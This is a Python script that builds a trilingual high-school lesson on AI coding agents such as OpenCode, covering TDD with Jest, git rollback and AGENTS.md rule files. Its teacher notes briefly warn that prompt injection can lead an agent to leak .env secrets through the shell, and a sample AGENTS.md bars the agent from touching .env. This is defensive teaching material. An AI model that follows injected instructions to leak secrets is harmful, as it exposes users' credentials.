        <div class="code-block" style="font-size:11px; line-height:1.5;">
<span style="color:#64748b;"># AGENTS.md namunasi</span>
## Loyiha Qoidalari
1. Arxitektura: Express + SQLite3
2. Testlash: Jest bilan TDD majburiy
3. Xavfsizlik: Barcha parollar bcrypt bilan heshlanadi
4. Git: Har bir yangi funksiya alohida commit bo'ladi

<span style="color:#22c55e;">// Natija: Agent bu qoidalarni buzmaydi va
// o'zicha boshqa kutubxona o'rnatib tashlamaydi!</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SLIDE 11: HANDS-ON LAB INTRODUCTION -->
  <section class="slide" data-phase="Amaliyot|Практика|Practice" data-time="58:00–68:00" data-slide-index="10">
    <div class="eyebrow"><span class="t" data-ru="ПРАКТИЧЕСКИЙ ТЕРМИНАЛ · OPENCODE STUDIO" data-en="HANDS-ON TERMINAL · OPENCODE STUDIO">AMALIY ARENA · OPENCODE STUDIO</span></div>
    <h2 data-ru="Лаборатория: TDD Разработка Калькулятора с Агентом" data-en="Hands-on Lab: TDD Calculator Engineering with Agent">Laboratoriya: Agent Bilan TDD Usulida Dastur Yaratish</h2>
    <div class="hero-split">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Сценарий Миссии" data-en="Mission Scenario">Kiber-Topshiriq</div>
        <h3 data-ru="Разработка Модуля Калькулятора" data-en="Calculator Math Module">Matematik Modul va Testlar</h3>
        <p data-ru="Вам поручено создать модуль calculator.js с функциями divide(a, b) и factorial(n). Вы напишете падающие тесты на деление на ноль, а OpenCode напишет реализацию и добьется 100% зеленого отчета Jest." data-en="You are tasked with engineering calculator.js with divide(a, b) and factorial(n). Write failing tests for zero division, then instruct OpenCode to fulfill implementation until 100% Jest green.">Sizga divide(a, b) va factorial(n) funksiyalariga ega modul yaratish topshirildi. Avval nolga bo'lish xatosini tekshiruvchi qizil test yozasiz, so'ng OpenCode ga kodni to'ldirib, testlarni 100% yashil qilishni buyurasiz.</p>
        <div class="box" style="margin-top:12px;">
          <strong data-ru="Шаги в терминале:" data-en="Terminal Steps:">Amallar ketma-ketligi:</strong>
          <ul style="font-size:12px; line-height:1.6; margin-top:4px;">
            <li data-ru="1. Написать падающий test('divide by zero throws')" data-en="1. Formulate test('divide by zero throws')">1. Qizil test yozish: divide(10, 0) xato berishi kerak.</li>
            <li data-ru="2. Запустить OpenCode и отдать команду реализации" data-en="2. Launch OpenCode and command implementation">2. OpenCode ga buyruq berish: "Kodni yoz va testdan o'tkaz".</li>
            <li data-ru="3. Проверить git diff и принять изменения" data-en="3. Inspect git diff and accept patch">3. git diff orqali o'zgarishlarni tekshirib qabul qilish.</li>
          </ul>
        </div>
      </div>
      <div class="card" style="display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:rgba(15,23,42,0.6);">
        <div style="font-size:42px; margin-bottom:10px;">💻 🤖 🧪 🚀</div>
        <h3 data-ru="Запуск OpenCode Studio" data-en="Launch OpenCode Studio">OpenCode Kiber-Terminal</h3>
        <p style="font-size:13px; max-width:320px; color:var(--ink-secondary);" data-ru="Откройте simulator/index.html для интерактивной симуляции работы OpenCode CLI." data-en="Open simulator/index.html for interactive OpenCode CLI simulation.">OpenCode CLI agentining jonli ishlashini sinab ko'rish uchun studiyani oching.</p>
        <a href="simulator/index.html" target="_blank" style="display:inline-block; margin-top:14px; padding:10px 20px; border-radius:10px; background:var(--accent); color:#fff; text-decoration:none; font-weight:700; font-size:13px;" data-ru="🚀 Открыть OpenCode Studio" data-en="🚀 Open OpenCode Studio">🚀 Studiyani Ochish</a>
      </div>
    </div>
  </section>

  <!-- SLIDE 12: PEER-REVIEW & CODE REVIEW -->
  <section class="slide" data-phase="Taqdimot|Код-Ревью|Review" data-time="68:00–74:00" data-slide-index="11">
    <div class="eyebrow"><span class="t" data-ru="ВЗАИМНАЯ ПРОВЕРКА · КОД-РЕВЬЮ" data-en="PEER CODE REVIEW · QUALITY ASSURANCE">JUFTLIKDA KOD-REVYU · SIFAT NAZORATI</span></div>
    <h2 data-ru="Взаимный Аудит: Проверь Код Напарника Через Git Diff" data-en="Peer Audit: Inspecting Teammate's Patch via Git Diff">Juftlikda Tekshiruv: Partadoshingizning Git Diff Kodini Tekshiring</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Роль: Lead Reviewer" data-en="Role: Lead Reviewer">Senior Reviewer Vazifasi</div>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="[ ] Все ли тесты Jest завершились зеленым (PASS)?" data-en="[ ] Did all Jest test suites PASS cleanly?">[ ] Barcha Jest testlari yashil bo'lib (PASS) o'tdimi?</li>
          <li data-ru="[ ] Нет ли лишних изменений в файлах по git diff?" data-en="[ ] Are there any unneeded modifications in git diff?">[ ] git diff da ortiqcha o'zgartirilgan fayllar yo'qmi?</li>
          <li data-ru="[ ] Добавлена ли проверка деления на ноль (throw Error)?" data-en="[ ] Is zero division safely handled with throw Error?">[ ] Nolga bo'lish xatosi (throw Error) to'g'ri ushlanganmi?</li>
          <li data-ru="[ ] Создан ли понятный Git commit сообщением 'feat: ...'?" data-en="[ ] Is there a structured 'feat: ...' commit message?">[ ] Aniq 'feat: ...' ko'rinishidagi Git commit qilindimi?</li>
        </ul>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Демо на Смартборде" data-en="Smartboard Demo">Smartboard Demosi</div>
        <h3 data-ru="Показ Зеленого Тест-Раннера" data-en="Green Test Suite Showcase">Yashil Testlar Taqdimoti</h3>
        <p data-ru="Две пары учеников выводят свой терминал на экран смартборда и демонстрируют, как OpenCode за 3 секунды исправил сломанный тест и успешно прошел регрессионное тестирование." data-en="Two pairs project their terminals to demonstrate how OpenCode healed a broken test in 3 seconds flat.">2 ta juftlik o'z terminalini katta doskaga chiqaradi va OpenCode qanday qilib 3 soniyada xatoni topib, testlarni yashil qilganini ko'rsatib beradi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 13: ADVANCED SUBAGENTS ARCHITECTURE -->
  <section class="slide" data-phase="Kengaytirish|Субагенты|Subagents" data-time="74:00–77:00" data-slide-index="12">
    <div class="eyebrow"><span class="t" data-ru="ПРОДВИНУТЫЙ УРОВЕНЬ · СУБАГЕНТЫ В CLI" data-en="ADVANCED CONCEPT · CLI SUBAGENTS">MURAKKAB TIZIM · CLI SUBAGENTLARI</span></div>
    <h2 data-ru="Субагенты: Разделение Труда (Coder + Tester + Reviewer)" data-en="Subagents: Division of Labor (Coder + Tester + Reviewer)">Subagentlar: Mehnat Taqsimoti (Coder + Tester + Reviewer)</h2>
    <div class="card">
      <div class="code-block" style="font-size:12px; line-height:1.7;">
[ Boshqaruvchi Agent (Orchestrator) ]
                │
     ┌──────────┼──────────┐
     ▼          ▼          ▼
 [ Coder ]  [ Tester ]  [ Security ]
  Kod yozadi  Jest yuritadi .env tekshiradi
     │          │          │
     └──────────┼──────────┘
                ▼
     [ Yakuniy Git Commit ]
      </div>
      <p style="font-size:12px; margin-top:8px; color:var(--ink-secondary);" data-ru="В современных CLI инструментах один агент делегирует задачи специализированным субагентам, снижая расход токенов на 40% и исключая глупые ошибки." data-en="Modern CLI tools delegate slices of work to specialized subagents, slashing token consumption by 40% and eliminating hallucinations.">Ilg'or CLI tizimlari vazifalarni tor ixtisoslashgan subagentlarga bo'lib beradi, bu esa token sarfini 40% ga tejaydi va xatolarni yo'qotadi.</p>
    </div>
  </section>

  <!-- SLIDE 14: SUMMARY & 3-TIER HOMEWORK -->
  <section class="slide" data-phase="Xulosa|Итоги|Summary" data-time="77:00–80:00" data-slide-index="13">
    <div class="eyebrow"><span class="t" data-ru="ИТОГИ УРОКА И ДОМАШНЕЕ ЗАДАНИЕ · 10 БАЛЛОВ" data-en="SUMMARY & 3-TIER HOMEWORK · 10 POINTS">XULOSA VA 3 DARAJALI UY VAZIFASI · 10 BALL</span></div>
    <h2 data-ru="Итоги Урока и Домашнее Задание" data-en="Lesson Summary & Homework">Xulosa va 3 Darajali Uy Vazifasi</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Уровень 1: База (4 балла)" data-en="Tier 1: Core (4 pts)">1-Daraja: Baza (4 ball)</div>
        <h3 data-ru="TDD Тест и AGENTS.md" data-en="TDD Spec & AGENTS.md">TDD Test va AGENTS.md</h3>
        <p data-ru="Написать файл AGENTS.md для Node.js проекта и составить падающий тест Jest для функции calculateDiscount(price, percent)." data-en="Formulate AGENTS.md and write a failing Jest test for calculateDiscount(price, percent).">Loyiha uchun AGENTS.md qoidalarini yozish va calculateDiscount(price, percent) funksiyasi uchun qizil Jest testini tuzish.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Уровень 2: Инженерия (4 балла)" data-en="Tier 2: Engineering (4 pts)">2-Daraja: Muhandislik (4 ball)</div>
        <h3 data-ru="OpenCode Реализация и Билд" data-en="OpenCode Implementation">Avtonom Kod va Yashil Test</h3>
        <p data-ru="Используя OpenCode, реализовать функцию со всеми краевыми условиями (отрицательная цена, percent > 100) и добиться 100% PASS." data-en="Use OpenCode to implement edge cases (negative values, percent > 100) achieving 100% green PASS.">OpenCode orqali barcha chekka holatlarni (manfiy sonlar, 100 dan katta foiz) hisobga olgan kodni yozdirib, testlarni 100% yashil qilish.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Уровень 3: Челлендж (2 балла)" data-en="Tier 3: Challenge (2 pts)">3-Daraja: Kiber-Challenge (2 ball)</div>
        <h3 data-ru="Git Rollback Скрипт" data-en="Git Rollback Automation">Avtomatik Rollback Qalqoni</h3>
        <p data-ru="Написать pre-commit хук или bash-скрипт, который перед коммитом прогоняет тесты: если тесты падают, делает автоматический git reset." data-en="Code a bash script running test suites before commit: if tests fail, trigger automatic git reset rollback.">Bash skript yozish: commit oldidan testlarni tekshiradi; agar bitta test qulasa, zudlik bilan git reset qilib orqaga qaytaradi.</p>
      </div>
    </div>
    <div class="box" style="margin-top:14px; text-align:center;">
      <p style="font-size:13px;" data-ru="💡 Практическое задание доступно в файле vazifa.html с интерактивной проверкой и сохранением в LocalStorage." data-en="💡 Interactive homework is bundled in vazifa.html with instant client testing and LocalStorage persistence.">💡 Interaktiv uy vazifasi <a href="vazifa.html" style="color:var(--accent); font-weight:700;">vazifa.html</a> faylida joylashgan bo'lib, avtomatik testlar va LocalStorage saqlash tizimiga ega.</p>
    </div>
  </section>
"""

# -----------------------------------------------------------------------------
# 2. TEACHER NOTES JSON (Triplets: [title, say, do])
# -----------------------------------------------------------------------------
NOTES_DATA = {
  "uz": [
    ["Kirish va Maqsad", "Bugun dasturiy ta'minot yaratishning eng cho'qqisi — Terminal-First AI agentlari (OpenCode va Claude Code) bilan TDD uslubida ishlashni o'rganamiz.", "Doskaga mavzuni yozing va slaydni oching."],
    ["Uy Vazifasi Tahlili", "O'tgan 31-darsdagi asosiy xato Retina monitorlarda masshtab koeffitsientini hisobga olmasdan koordinata bosish bo'ldi. Matematik formulani eslatamiz.", "O'quvchilardan blitz savolga javob oling."],
    ["CLI Davri", "Nega oddiy chat oynasi yetarli emas? Chunki dasturchi vaqtining 80%i kodni nusxalashga ketadi. CLI agentlari esa o'zi fayllarni ochib, testlarni tekshiradi.", "Chat va CLI farqini doskada taqqoslang."],
    ["OpenCode Anatomiyasi", "OpenCode ning 5 ta asosiy quroli: read_file, edit_file, run_command, search_files va git_diff. Ular orqali agent butun loyihani boshqaradi.", "Asosiy vositalar ro'yxatini tahlil qiling."],
    ["TDD Metodikasi", "Qizil (RED) -> Yashil (GREEN) -> Refaktor tsikli. Avval xato beruvchi test yoziladi, so'ng agent unga mos kodni yozadi.", "Doskaga 3 bosqichli TDD aylanmasini chizing."],
    ["Ko'p Faylli Boshqaruv", "Bitta funksiya o'zgarganda boshqa 4 ta fayldagi importlar ham o'zgarishi shart. OpenCode AST tahlili orqali butun loyihani buzmasdan yangilaydi.", "Sxemadagi bog'liqliklar zanjirini tushuntiring."],
    ["Git Sug'urtasi", "Agar agent gallyutsinatsiya qilib kodni buzsa, git reset --hard HEAD orqali 0.1 soniyada toza holatga qaytish mumkin.", "Git diff va rollback buyruqlarini ko'rsating."],
    ["Kiberxavfsizlik va HITL", "Zararli promptlar orqali agent .env sirlarini tarmoqqa sizdirishi mumkin. Shuning uchun terminal buyruqlari inson tasdig'i (HITL) bilan bo'lishi shart.", "Xavfli shell buyruqlaridan ogohlantiring."],
    ["Interaktiv Quiz", "4 ta chuqur muhandislik savoli orqali mavzuni mustahkamlaymiz. O'quvchilarni tahlil qilishga undaymiz.", "To'g'ri javoblarni ochib, tushuntiring."],
    ["AGENTS.md Qoidalari", "Loyiha ildizidagi AGENTS.md fayli agent uchun konstitutsiya hisoblanadi. U texnologik cheklovlar va taqiqlarni belgilaydi.", "AGENTS.md namunaviy qoidalarini ko'rib chiqing."],
    ["Amaliy Topshiriq", "Endi simulyatorda kalkulyator funksiyasi uchun qizil test yozib, OpenCode orqali uni yashil qilishni bajaramiz.", "O'quvchilarni simulator/index.html ga yo'naltiring."],
    ["Juftlikda Kod-Revyu", "Partadoshlar bir-birining git diff natijalarini va Jest testlarini tekshirib chiqishadi.", "Sinf bo'ylab faol guruhlarni rag'batlantiring."],
    ["Subagentlar Tizimi", "Katta loyihalarda boshqaruvchi agent vazifalarni Coder, Tester va Security subagentlariga bo'lib beradi.", "Taqsimlangan agentlar arxitekturasini tushuntiring."],
    ["Xulosa va Uy Vazifasi", "Bugun haqiqiy AI muhandislik amaliyotini o'rgandik. 3 darajali uy vazifasi vazifa.html da mavjud, 10 ballik mezonni bajaring.", "Uy vazifasi talablarini eslatib, darsni yakunlang."]
  ],
  "ru": [
    ["Введение и Цель", "Сегодня мы осваиваем вершину современной разработки — Terminal-First ИИ-агентов (OpenCode и Claude Code) в цикле TDD.", "Запишите тему на доске и откройте слайд 1."],
    ["Разбор Домашнего Задания", "Главная ошибка 31-го урока — клики без учета HiDPI масштабирования Retina дисплеев. Разбираем формулу пересчета координат.", "Примите ответы на блиц-вопрос."],
    ["Эра CLI-Агентов", "Почему веб-чаты устарели? 80% времени тратится на копирование кода. CLI-агенты напрямую редактируют файлы и гоняют тесты.", "Сравните поколения инструментов на доске."],
    ["Анатомия OpenCode", "5 главных инструментов агента: read_file, edit_file, run_command, search_files и git_diff. Полный контроль проекта.", "Поясните назначение каждого инструмента."],
    ["Методология TDD", "Цикл Красный (RED) -> Зеленый (GREEN) -> Рефакторинг. Сначала пишется падающий тест, затем агент реализует код.", "Изобразите цикл TDD на доске."],
    ["Многофайловый Контекст", "При изменении сигнатуры функции обновляются все зависимые файлы. OpenCode через AST сохраняет целостность кодовой базы.", "Поясните цепочку импортов."],
    ["Страховка Git", "Если агент зашел в тупик, команда git reset --hard HEAD мгновенно откатит проект к чистому коммиту.", "Продемонстрируйте git diff и откат."],
    ["Кибербезопасность и HITL", "Вредоносный промпт может попытаться слить .env файл. Поэтому запуск bash требует подтверждения Human-in-the-Loop.", "Подчеркните правила безопасности."],
    ["Интерактивный Квиз", "Закрепляем теорию через 4 инженерных вопроса. Вовлекайте учеников в дискуссию.", "Разберите логику правильных ответов."],
    ["Файл AGENTS.md", "Конституция проекта AGENTS.md в корне репозитория задает жесткие правила стека и запретов для ИИ.", "Разберите пример структуры AGENTS.md."],
    ["Практическая Лаборатория", "В симуляторе создаем падающий тест калькулятора и делегируем реализацию OpenCode до зеленого Jest билда.", "Контролируйте работу в simulator/index.html."],
    ["Взаимное Код-Ревью", "Напарники инспектируют git diff друг друга и проверяют статус юнит-тестов.", "Отметьте лучших тестировщиков."],
    ["Архитектура Субагентов", "В крупных системах оркестратор делегирует задачи субагентам Coder, Tester и Security, экономя токены.", "Поясните схему специализации."],
    ["Итоги и Задание", "Мы изучили стандарты агентной разработки. Домашнее задание на 10 баллов готово в vazifa.html.", "Напомните критерии и завершите урок."]
  ],
  "en": [
    ["Intro & Mission", "Today we master the cutting edge of software engineering: Terminal-First AI coding agents (OpenCode, Claude Code) driven by TDD loops.", "Write title on board and project slide 1."],
    ["Homework Review", "The core pitfall in lesson 31 was clicking without HiDPI coordinate scaling. Reviewing mathematical translation formulas.", "Collect answers to the blitz question."],
    ["The CLI Paradigm", "Why web chats lose: 80% friction wasted on copy-pasting code. CLI agents operate directly in the shell and filesystem.", "Contrast web chats vs CLI agents."],
    ["OpenCode Anatomy", "The 5 core agent tools: read_file, edit_file, run_command, search_files, and git_diff. Autonomous command line execution.", "Review tool capabilities step-by-step."],
    ["TDD Methodology", "Red -> Green -> Refactor cycle. Formulate a failing test first, then instruct the agent to implement until green.", "Sketch the 3-step TDD cycle on the board."],
    ["Multi-File Refactoring", "Renaming an export requires updating all downstream consumers. OpenCode leverages AST scanning to prevent broken imports.", "Trace cross-file dependencies."],
    ["Git Safety Net", "If an agent hallucinates, git reset --hard HEAD restores pristine project state in 0.1 seconds.", "Demonstrate diff inspections and rollbacks."],
    ["Security & HITL", "Prompt injections can trick agents into leaking .env secrets via shell. Human-in-the-Loop gates are non-negotiable.", "Review dangerous shell vectors."],
    ["Interactive Quiz", "Reinforce architecture concepts with 4 deep engineering quiz questions.", "Reveal solutions and clarify mechanics."],
    ["AGENTS.md Governance", "The AGENTS.md constitution file in repo root enforces strict tech constraints, test mandates, and rules.", "Walk through an exemplary AGENTS.md."],
    ["Hands-on Lab", "In the simulator, formulate a failing calculator test and command OpenCode to achieve a 100% green Jest suite.", "Guide students in simulator/index.html."],
    ["Peer Code Review", "Partners inspect each other's git diff patches and verify test assertion integrity.", "Praise robust test suites in the room."],
    ["Subagents Network", "Large CLI tools divide work across specialized Coder, Tester, and Security subagents, slashing tokens by 40%.", "Explain orchestrator-worker patterns."],
    ["Summary & Homework", "We mastered autonomous CLI coding. The 3-tier homework is ready in vazifa.html for 10 total points.", "Summarize key rules and conclude."]
  ]
}

def build_presentation():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_PREZENTATSIYA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Taqdimot shabloni — Target Maktabi</title>", "<title>10-11-sinf: Avtonom Kod Agentlari va OpenCode</title>")
    tpl = re.sub(r'name="total-slides"\s+content="\d+"', 'name="total-slides" content="14"', tpl)
    tpl = re.sub(r'id="totalSlides">0</span>', 'id="totalSlides">14</span>', tpl)

    stage_regex = r'<div class="stage">[\s\S]*?</div><!-- /stage -->'
    new_stage = f'<div class="stage">\n{SLIDES_HTML}\n</div><!-- /stage -->'
    tpl = re.sub(stage_regex, lambda m: new_stage, tpl)

    notes_json = json.dumps(NOTES_DATA, ensure_ascii=False, indent=2)
    notes_regex = r'var NOTES\s*=\s*\{[\s\S]*?\};'
    tpl = re.sub(notes_regex, lambda m: f'var NOTES = {notes_json};', tpl)

    out_path = os.path.join(DEST_DIR, "prezentatsiya.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: prezentatsiya.html")

def build_worksheet():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_VARAQA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Amaliy Ish Varaqasi — Target Maktabi</title>", "<title>Ish Varaqasi: Avtonom Kod Agentlari va OpenCode — 10-11-sinf</title>")
    tpl = tpl.replace("1-AMALIY ISH VARAQASI", "32-AMALIY ISH VARAQASI")
    tpl = tpl.replace("Mavzu: Kirish va Vibecoding asoslari", "Mavzu: Avtonom Kod Yozuvchi Agentlar va CLI Vositalari: OpenCode, Claude Code va TDD Refaktoring")

    worksheet_body = """
  <div class="mission-box">
    <div class="mission-title" data-ru="МИССИЯ УРОКА: ИНЖЕНЕРИЯ АВТОНОМНЫХ CLI-АГЕНТОВ" data-en="LESSON MISSION: AUTONOMOUS CLI AGENT ENGINEERING">DARSNING KIBER-MISSIYASI: AVTONOM CLI AGENTLARI ARXITEKTURASI</div>
    <p style="font-size:12px; margin-top:4px;" data-ru="Освоить архитектуру консольных агентов OpenCode и Claude Code, применить методологию TDD для генерации кода с авто-тестами Jest, научиться работать с Git diff и создать файл правил AGENTS.md." data-en="Master OpenCode & Claude Code CLI agent architectures, practice TDD code generation verified by Jest test suites, inspect Git diffs, and configure project AGENTS.md rules.">OpenCode va Claude Code konsol agentlari arxitekturasini o'rganish, Jest testlari bilan kafolatlangan TDD metodikasini qo'llash, Git diff orqali o'zgarishlarni tekshirish va loyiha uchun AGENTS.md qoidalarini shakllantirish.</p>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">1</span>
      <h3 data-ru="Анализ Инструментов CLI-Агента (2 балла)" data-en="CLI Agent Tool Analysis (2 pts)">CLI Agenti Asosiy Vositalari Tahlili (2 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="Опишите назначение каждого встроенного инструмента агента OpenCode:" data-en="State the technical responsibility of each OpenCode agent tool:">OpenCode agentining har bir vositasi vazifasini yozing:</p>
    <table style="width:100%; border-collapse:collapse; margin-top:8px; font-size:11px;">
      <thead>
        <tr style="background:var(--card-bg, #f1f5f9);">
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Инструмент (Tool)" data-en="Tool">Vosita (Tool)</th>
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Входные параметры" data-en="Arguments">Kiruvchi parametrlar</th>
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Действие в файловой системе / ОС" data-en="OS Action">Tizimda nima qiladi?</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>edit_file</code>" data-en="<code>edit_file</code>"><code>edit_file</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>path, target, replacement</code>" data-en="<code>path, target, replacement</code>"><code>path, target, replacement</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="Точечная замена строк кода" data-en="Surgical line replacement">________________________</td>
        </tr>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>run_command</code>" data-en="<code>run_command</code>"><code>run_command</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>command_line</code>" data-en="<code>command_line</code>"><code>command_line</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="Исполнение bash-команды в PTY" data-en="Executes shell command in PTY">________________________</td>
        </tr>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>git_diff</code>" data-en="<code>git_diff</code>"><code>git_diff</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="<code>staged: boolean</code>" data-en="<code>staged: boolean</code>"><code>staged: boolean</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="Проверка измененных строк перед коммитом" data-en="Verifies diff patch before commit">________________________</td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">2</span>
      <h3 data-ru="Разработка TDD Теста: RED Фаза (3 балла)" data-en="TDD Test Engineering: RED Phase (3 pts)">TDD Testini Loyihalash: RED Bosqichi (3 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="Напишите падающий юнит-тест Jest для функции calculateDiscount(price, percent), которая должна выбрасывать ошибку Error при percent > 100 или price < 0:" data-en="Write a failing Jest test for calculateDiscount(price, percent) throwing Error if percent > 100 or price < 0:">percent > 100 yoki price < 0 bo'lganda Error tashlashi shart bo'lgan calculateDiscount funksiyasi uchun qizil Jest testini yozing:</p>
    <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:10px; margin-top:8px; font-family:monospace; font-size:11px;">
      test("should throw error when discount percent exceeds 100", () => {<br>
      &nbsp;&nbsp;expect(() => {<br>
      &nbsp;&nbsp;&nbsp;&nbsp;calculateDiscount(1000, 150);<br>
      &nbsp;&nbsp;}).toThrow("____________________________________");<br>
      });
    </div>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">3</span>
      <h3 data-ru="Конституция Проекта: Файл AGENTS.md (3 балла)" data-en="Project Constitution: AGENTS.md (3 pts)">Agent Konstitutsiyasi: AGENTS.md (3 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="Сформулируйте 3 критических правила для файла AGENTS.md, которые предотвратят повреждение проекта автономным агентом:" data-en="Formulate 3 critical rules in AGENTS.md preventing autonomous agent breakage:">Loyiha xavfsizligini ta'minlash uchun AGENTS.md fayliga kiritilishi shart bo'lgan 3 ta qat'iy qoidani yozing:</p>
    <div style="margin-top:6px; font-size:12px; line-height:1.8;">
      1. ________________________________________________________________________________<br>
      2. ________________________________________________________________________________<br>
      3. ________________________________________________________________________________
    </div>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">4</span>
      <h3 data-ru="Критерии Оценки и Рефлексия (2 балла)" data-en="Evaluation Rubric & Reflection (2 pts)">Baholash Mezoni va Xulosa (2 ball)</h3>
    </div>
    <div style="display:flex; justify-content:space-between; font-size:11px; margin-top:6px;">
      <span>[ ] 1-Daraja: CLI Asos & TDD (4 ball)</span>
      <span>[ ] 2-Daraja: OpenCode PASS (4 ball)</span>
      <span>[ ] 3-Daraja: Rollback Skript (2 ball)</span>
    </div>
  </div>
"""
    tpl = re.sub(r'<!-- PAGE 1:[\s\S]*?(?=\n<script>)', lambda m: f'<div class="sheet">\n{worksheet_body}\n</div>', tpl)

    out_path = os.path.join(DEST_DIR, "varaqa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: varaqa.html")

def build_homework():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_VAZIFA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Vazifa Shabloni — Target Maktabi</title>", "<title>Uy Vazifasi: Avtonom Kod Agentlari va OpenCode — 10-11-sinf</title>")
    tpl = tpl.replace("1-AMALIY VAZIFA", "32-AMALIY VAZIFA")
    tpl = tpl.replace("Mavzu: Kirish va Vibecoding Asoslari", "Mavzu: Avtonom Kod Yozuvchi Agentlar va CLI Vositalari: OpenCode, Claude Code va TDD Refaktoring")

    hw_body = """
  <div class="hw-card">
    <div class="hw-header">
      <span class="badge" style="background:var(--accent); color:#fff;" data-ru="Уровень 1: База (4 балла)" data-en="Tier 1: Core (4 pts)">1-Daraja: Baza (4 ball)</span>
      <h3 data-ru="Файл AGENTS.md и Тест Скидки" data-en="AGENTS.md & Discount Test">AGENTS.md Qoidalari va TDD Testi</h3>
    </div>
    <p style="font-size:13px;" data-ru="Сформируйте конфигурационный файл AGENTS.md с правилами стека и напишите юнит-тест Jest:" data-en="Write project AGENTS.md instructions and a failing Jest unit test:">Loyiha uchun AGENTS.md qoidalarini yozing va qizil Jest testini kiriting:</p>
    <div class="code-area">
      <textarea id="codeTier1" rows="10" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="# AGENTS.md..." data-placeholder-en="# AGENTS.md...">
# AGENTS.md
- Stack: Node.js (ES Modules), Jest
- TDD: Test always required before implementation
- Safety: Never touch .env or leak API keys

// tests/discount.test.js
test("calculateDiscount throws error if percent > 100", () => {
    expect(() => calculateDiscount(100, 150)).toThrow("Invalid discount");
});
</textarea>
    </div>
    <button onclick="testTier1()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--accent); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Проверить тест" data-en="Verify Test">Tekshirish</button>
    <span id="resTier1" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <div class="hw-card" style="margin-top:16px;">
    <div class="hw-header">
      <span class="badge" style="background:var(--success); color:#fff;" data-ru="Уровень 2: Инженерия (4 балла)" data-en="Tier 2: Engineering (4 pts)">2-Daraja: Muhandislik (4 ball)</span>
      <h3 data-ru="Реализация Функции с Краевыми Условиями" data-en="Edge-Case Implementation">Xatolarni Hisobga Oluvchi Kod</h3>
    </div>
    <p style="font-size:13px;" data-ru="Реализуйте функцию calculateDiscount(price, percent), которая корректно обрабатывает все краевые случаи:" data-en="Implement calculateDiscount(price, percent) handling all edge conditions safely:">Barcha chekka holatlarni (manfiy narx, percent > 100) xavfsiz ushlovchi funksiya kodini yozing:</p>
    <div class="code-area">
      <textarea id="codeTier2" rows="9" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="function calculateDiscount(price, percent) { ... }" data-placeholder-en="function calculateDiscount(price, percent) { ... }">
function calculateDiscount(price, percent) {
    if (price < 0 || percent < 0 || percent > 100) {
        throw new Error("Invalid discount parameters");
    }
    const discountAmount = (price * percent) / 100;
    return price - discountAmount;
}
</textarea>
    </div>
    <button onclick="testTier2()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--success); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Проверить функцию" data-en="Verify Function">Funksiyani Sinash</button>
    <span id="resTier2" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <div class="hw-card" style="margin-top:16px;">
    <div class="hw-header">
      <span class="badge" style="background:var(--danger); color:#fff;" data-ru="Уровень 3: Челлендж (2 балла)" data-en="Tier 3: Challenge (2 pts)">3-Daraja: Kiber-Challenge (2 ball)</span>
      <h3 data-ru="Bash Скрипт Автоматического Отката Git" data-en="Bash Rollback Interceptor">Bash Avto-Rollback Skripti</h3>
    </div>
